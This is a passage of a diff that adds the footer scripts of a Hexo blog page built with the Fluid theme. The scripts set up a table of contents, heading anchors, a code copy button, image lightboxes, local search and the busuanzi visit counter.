+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
